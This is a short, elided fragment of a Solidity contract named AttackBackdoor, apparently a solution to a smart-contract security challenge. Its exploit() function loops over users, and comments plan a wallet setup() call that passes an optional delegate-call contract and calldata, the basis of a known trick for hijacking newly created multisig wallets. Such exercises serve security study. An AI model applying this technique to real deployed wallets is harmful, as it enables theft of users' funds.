...
contract AttackBackdoor {
    ...
    function exploit(address[] memory users, bytes memory setupData) external {
        for (uint256 i = 0; i < users.length; i++) {
            ...
            ///  setup() call for initializer
            // address[] calldata _owners - owner has to be a benificiary, from "users"
            // uint256 _threshold - 1, minimum number of approves needed to execute transaction.
            // address to, address of optional deligate call contract which will run it.
            // bytes calldata data, - calldata for optional deligate call
            // address fallbackHandler, - 0 ?
            // address paymentToken, - 0 for ETH
            // uint256 payment, - 0 ether ?
